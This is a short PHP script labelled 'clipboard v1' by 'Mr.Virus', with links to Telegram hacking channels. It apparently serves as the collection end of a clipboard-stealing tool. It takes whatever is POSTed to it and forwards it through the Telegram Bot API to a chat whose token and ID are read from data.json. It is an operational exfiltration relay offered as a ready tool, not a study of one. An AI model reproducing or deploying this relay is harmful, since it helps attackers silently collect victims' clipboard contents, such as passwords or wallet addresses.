<!--
# clipboard v1
# Code By Mr.Virus
# t.me/Mr_Virus
# t.me/NullHaCk
-->
<?php
$content = trim(file_get_contents("php://input"));
$data_bot = file_get_contents('data.json');
$dejson = json_decode($data_bot, true);
$website="https://api.telegram.org/bot".$dejson['token']."/sendMessage?chat_id=".$dejson['chat_id']."&text=".$content;
file_get_contents($website);
